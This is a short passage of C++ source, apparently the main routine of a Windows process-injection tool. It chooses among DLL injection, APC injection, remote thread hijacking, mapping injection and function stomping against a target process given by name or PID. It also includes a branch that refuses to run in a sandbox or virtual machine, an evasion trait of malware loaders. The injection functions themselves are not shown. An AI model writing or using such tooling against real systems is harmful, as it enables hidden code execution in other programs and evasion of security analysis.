		{
			TrashData();
			std::cout << "\033[2J\033[1;1H"<<endl<<endl<<endl;
			cout << "	[-] Don't Run This In SandBox Or Virtual Machine :(" << endl;
			return 0;
		}
		if (type == 1) //DLLInject
		{
			DWORD PID = GetProcessPID(argv[1]);
			DLLInject(PID, argv[2]);
		}
		else if (type == 2)  //APCInject
		{
			DWORD PID = GetProcessPID(argv[1]);
			APCInject(PID, argv[2]);

		}
		else if (type == 3)   //RemoteThreadHiJacking 
		{
			if (!TraverseProcess(argv[1]))
				return 0;
			DWORD ProcessPID;
			cin >> ProcessPID;
			RemoteThreadHiJacking(ProcessPID, argv[2]);
		}
		else if (type == 4)  //Remote Mapping Inject 
		{
			MappingInject(argv[1], argv[2]);
		}
		else if (type == 5)
		{
			FunctionStomping(argv[1], argv[2]);
		}
		else {
			TrashData();
			cout << "	[-] Please choose the number below :(" << endl;
			return 0;
		}
	}
	else
	{
		TrashData();
		cout << "	[-] Two Parameters are required" << endl;
		return 0;
	}

	return 0;
}